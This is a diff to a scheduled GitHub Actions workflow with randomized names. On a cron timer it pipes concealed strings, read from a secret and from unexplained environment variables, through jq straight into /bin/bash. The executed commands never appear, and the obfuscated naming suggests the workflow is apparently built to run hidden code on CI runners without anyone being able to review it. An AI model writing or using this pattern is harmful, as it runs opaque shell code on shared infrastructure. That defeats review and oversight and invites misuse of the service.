@@ -3,8 +3,7 @@ name: chengliangqiang5432
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
-
+    - cron: '58 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,22 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengliangqiang5432
         env:
-          z1517: ${{ secrets.z1517 }}
+          lp1: ${{ secrets.lp1 }}
         run: |
-          echo $z1517 | jq -r .sozct4947 | /bin/bash
-          echo $evvya2467 | jq -r .ggr7 | /bin/bash
-          echo $i04 | jq -r .fscx390 | /bin/bash
-          echo $ags34 | jq -r .yoce9 | /bin/bash
-          echo $lil5165 | jq -r .mrwz8 | /bin/bash
-          echo $pdda4 | jq -r .mdeke381 | /bin/bash
-          echo $txxm45 | jq -r .cufxe6 | /bin/bash
-          echo $q7598 | jq -r .nj702 | /bin/bash
-          echo $w95056 | jq -r .ylr8 | /bin/bash
-          echo $bud1899 | jq -r .ah391 | /bin/bash
-          echo $jp9 | jq -r .svdvb07 | /bin/bash
-          echo $xdsrd4 | jq -r .sckyp4 | /bin/bash
-          echo $lgm223 | jq -r .dtgr81177 | /bin/bash
-          echo $ib99937 | jq -r .x7 | /bin/bash
-          echo $d444 | jq -r .tit3 | /bin/bash
-          echo $gy366 | jq -r .pvdb13 | /bin/bash
+          echo $lp1 | jq -r .ps2859 | /bin/bash
+          echo $c26 | jq -r .oxnu4389 | /bin/bash
+          echo $rd79 | jq -r .kcft7866 | /bin/bash
+          echo $q1 | jq -r .dpk81 | /bin/bash
+          echo $pxj098 | jq -r .gl4 | /bin/bash
 
